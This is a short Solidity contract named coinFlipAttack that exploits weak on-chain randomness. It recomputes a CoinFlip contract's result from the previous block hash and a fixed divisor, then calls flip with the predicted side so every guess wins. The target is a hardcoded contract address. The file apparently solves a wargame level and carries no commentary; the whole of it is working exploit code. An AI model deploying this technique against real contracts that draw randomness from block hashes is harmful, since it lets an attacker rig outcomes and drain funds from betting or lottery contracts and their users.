import "./CoinFlip.sol";

contract coinFlipAttack {
    CoinFlip public vulnerableContract = CoinFlip(0x2e696745a0692C3d828BDfEB6B2b22841717F270);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hackFlip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;

        bool side = coinFlip == 1 ? true : false;

        vulnerableContract.flip(side);

        return true;
    }
}